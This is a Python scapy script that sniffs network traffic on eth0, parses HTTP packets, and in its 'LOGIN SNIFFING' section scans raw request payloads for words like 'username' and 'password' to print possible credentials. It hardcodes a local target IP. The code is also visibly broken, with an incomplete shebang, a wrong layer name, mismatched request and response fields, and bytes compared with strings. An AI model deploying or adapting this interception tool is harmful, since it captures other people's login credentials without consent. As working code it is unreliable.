#!/usr/bin/env
import scapy.all as scapy
#from scapy_ssl_tls.ssl_tls import *
from scapy.layers import http

def initialise():
    scapy.sniff("eth0", store=False, prn=filter_packets)

def filter_http_packet(packet, target):
    packet.conversations()
    if packet.haslayer(scapy.IP):
        if packet.haslayer(http.HTTPRequest):
            #filter_https_request(packet)
            pass
        if packet.haslayer(http.HTTPResponse):
            #filter_http_response(packet)
            pass
        if packet.haslayer(scapy.Ether):
            pass
    if packet.haslayer(scapy.ARP):
        pass
    

def filter_http_request(packet):
    protocol = "HTTP"
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    method = packet[http.HTTPRequest].Method
    encoding = packet[http.HTTPRequest].Accept_Encoding

    print("http request: ")
    packet[http.HTTPRequest].show()
    #print(url)

def filter_http_response(packet):
    status = packet[http.HTTPResponse].Status_Code + " " + packet[http.HTTPResponse].Reason_Phrase
    encoding = packet[http.HTTPRequest].Accept_Encoding
    #packet[http.HTTPResponse].show()


def filter_ethernet_layer(packet):
    source_mac = packet[scapy.Ethernet].src
    dest_mac = packet[scapy.Ethernet].dst
    return (source_mac, dest_mac)

def filter_IP_layer(packet):
    ttl = packet[scapy.IP].ttl
    source_ip = packet[scapy.IP].src
    dest_ip = packet[scapy.IP].dst

###################LOGIN SNIFFING #############################

    

def filter_http_login(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            extract_login(packet[scapy.Raw].load)

def extract_login(login_packet):
    login_identifier = ["user", "username", "user_name", "login", "email", "pass", "password", "pword"]
    for identifier in login_identifier:
        if identifier in login_packet:
            print("[+] possible username/ password: " + login_packet)
            break


#def filter_tls(packet):


def filter_packets(packet):
    filter_http_packet(packet, "192.168.0.34")
    #filter_tls(packet)
    filter_http_login(packet)

initialise()
